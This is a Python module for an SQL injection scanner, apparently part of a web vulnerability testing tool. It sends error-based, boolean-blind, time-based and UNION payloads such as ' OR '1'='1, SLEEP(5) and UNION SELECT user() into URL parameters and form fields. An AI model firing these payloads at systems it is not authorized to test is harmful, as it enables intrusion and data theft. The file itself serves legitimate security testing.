"""SQL Injection Scanner — OWASP A03:2021.

Improvements:
  - Tests ALL form fields (not just login fields)
  - Error-based, boolean-blind, time-based, and UNION detection
  - Better dedup: skip already-tested param+form combos
"""
import re
import time
from core.base_scanner import BaseScanner
from core.logger import vuln, debug

ERROR_SIGNATURES = [
    r"sql syntax", r"mysql_fetch", r"ora-\d{5}", r"syntax error",
    r"unclosed quotation", r"quoted string not properly terminated",
    r"microsoft ole db", r"odbc sql server", r"sqlite3?\.operationalerror",
    r"pg_query\(\)", r"warning.*mysql", r"valid mysql result",
    r"mssql", r"sybase", r"db2 sql error", r"jdbc.*exception",
    r"sqlexception", r"sql server.*driver", r"postgre.*error",
    r"pdo.*exception", r"com\.microsoft\.sqlserver",
    r"supplied argument is not a valid.*sql",
    r"you have an error in your sql",
    r"division by zero", r"invalid column name",
    r"column.*does not exist", r"table.*doesn.*exist",
]
ERROR_RE = re.compile("|".join(ERROR_SIGNATURES), re.IGNORECASE)

BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 OR 1=1",    "1 OR 1=2"),
    ("admin'--",    "admin'/*"),
    ("' OR 1=1--",  "' OR 1=2--"),
    ("1' OR '1'='1'--", "1' OR '1'='2'--"),
]
TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--", 4.5),
    ("' OR SLEEP(5)--",            4.5),
    ("' OR pg_sleep(5)--",         4.5),
    ("; SELECT SLEEP(5)--",        4.5),
    ("1; WAITFOR DELAY '0:0:5'--", 4.5),
]
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,user(),3--",
    "' UNION SELECT 1,database(),3--",
]
SKIP_FIELD_RE = re.compile(r"token|csrf|nonce|_method|authenticity", re.IGNORECASE)


class SQLiScanner(BaseScanner):
    MODULE_NAME = "sqli"
    OWASP_CATEGORY = "A03:2021 - Injection"

    def scan(self, urls: list) -> list:
        payloads = self.session.load_wordlist("sqli")
        findings = []
        tested = set()

        for url in urls:
            # URL params
            for param in self.get_url_params(url):
                key = f"url:{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)
                findings.extend(self._test_url(url, param, payloads))

            # All forms
            for form in self.get_forms(url):
                for field in form["inputs"]:
                    if SKIP_FIELD_RE.search(field):
                        continue
                    key = f"form:{form['url']}:{field}"
                    if key in tested:
                        continue
                    tested.add(key)
                    findings.extend(self._test_form(form, field, payloads))

        return findings

    def _test_url(self, url, param, payloads):
        findings = []

        # Error-based
        for payload in (payloads[:50] if payloads else ["'", "\"", "' OR '1'='1"]):
            resp = self.session.get(self.inject_param(url, param, payload))
            if resp and ERROR_RE.search(resp.text):
                findings.append(self.make_finding(
                    url=url, param=param, payload=payload,
                    evidence=self._extract_error(resp.text),
                    severity="CRITICAL",
                    description=f"Error-based SQLi in URL parameter '{param}'.",
                    remediation="Use parameterized queries / prepared statements.",
                ))
                vuln(f"  [VULN] SQLi (error/url) @ {url} param={param}")
                break

        # Boolean-based
        for true_pl, false_pl in BOOLEAN_PAIRS:
            rt = self.session.get(self.inject_param(url, param, true_pl))
            rf = self.session.get(self.inject_param(url, param, false_pl))
            if rt and rf and abs(len(rt.text) - len(rf.text)) > 50:
                findings.append(self.make_finding(
                    url=url, param=param, payload=true_pl,
                    evidence=f"Length differs: {len(rt.text)} vs {len(rf.text)}",
                    severity="CRITICAL",
                    description=f"Boolean-blind SQLi in URL parameter '{param}'.",
                    remediation="Use parameterized queries.",
                ))
                vuln(f"  [VULN] SQLi (boolean/url) @ {url} param={param}")
                break

        # Time-based
        for payload, threshold in TIME_PAYLOADS:
            injected = self.inject_param(url, param, payload)
            t0 = time.time()
            self.session.get(injected)
            elapsed = time.time() - t0
            if elapsed >= threshold:
                findings.append(self.make_finding(
                    url=url, param=param, payload=payload,
                    evidence=f"Response delayed {elapsed:.1f}s",
                    severity="CRITICAL",
                    description=f"Time-based blind SQLi in URL parameter '{param}'.",
                    remediation="Use parameterized queries.",
                ))
                vuln(f"  [VULN] SQLi (time-based/url) @ {url} param={param}")
                break

        return findings

    def _test_form(self, form, field, payloads):
        findings = []
        error_payloads = payloads[:30] if payloads else ["'", "\"", "' OR '1'='1", "' OR 1=1--"]

        for payload in error_payloads:
            results = self.test_form(form, payload, field_override=field)
            for fname, resp in results:
                if resp and ERROR_RE.search(resp.text):
                    findings.append(self.make_finding(
                        url=form["url"], param=field, payload=payload,
                        evidence=self._extract_error(resp.text),
                        severity="CRITICAL",
                        description=f"Error-based SQLi in form field '{field}'.",
                        remediation="Use parameterized queries / prepared statements.",
                    ))
                    vuln(f"  [VULN] SQLi (error/form) @ {form['url']} field={field}")
                    return findings

        # Boolean-blind via form
        for true_pl, false_pl in BOOLEAN_PAIRS[:3]:
            rt_results = self.test_form(form, true_pl, field_override=field)
            rf_results = self.test_form(form, false_pl, field_override=field)
            for (fn_t, rt), (fn_f, rf) in zip(rt_results, rf_results):
                if rt and rf and abs(len(rt.text) - len(rf.text)) > 100:
                    findings.append(self.make_finding(
                        url=form["url"], param=field, payload=true_pl,
                        evidence=f"Response length differs: {len(rt.text)} vs {len(rf.text)}",
                        severity="CRITICAL",
                        description=f"Boolean-blind SQLi in form field '{field}'.",
                        remediation="Use parameterized queries.",
                    ))
                    vuln(f"  [VULN] SQLi (boolean/form) @ {form['url']} field={field}")
                    return findings

        return findings

    def _extract_error(self, text):
        m = ERROR_RE.search(text)
        if m:
            start = max(0, m.start() - 30)
            return text[start:m.end() + 100].strip()
        return "SQL error detected"
